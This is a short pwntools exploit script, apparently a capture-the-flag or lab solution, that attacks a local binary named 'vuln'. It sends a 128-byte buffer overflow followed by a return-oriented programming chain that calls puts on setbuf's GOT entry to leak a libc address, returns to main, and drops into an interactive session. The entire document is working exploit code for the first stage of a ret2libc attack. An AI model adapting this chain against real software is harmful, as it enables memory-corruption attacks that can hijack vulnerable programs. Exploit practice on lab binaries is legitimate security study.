from pwn import *

#p = ELF('./vuln')
p = process('./vuln')

gdb.attach(p)

offset = 128
junk = b"A" * offset

pop_rdi = 0x400913
setbuf_at_got = 0x601028
puts_at_plt = 0x400540
back_to_main = 0x400771

payload = [
    junk,
    p64(pop_rdi), #ropper --file vuln --search "pop rdi"
    p64(setbuf_at_got),
    p64(puts_at_plt),
    p64(back_to_main),
]

payload = b"".join(payload)
p.sendline(payload)

p.recvline()
p.recvline()
print(p.recvline())
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"{hex(leak)=}")

p.interactive()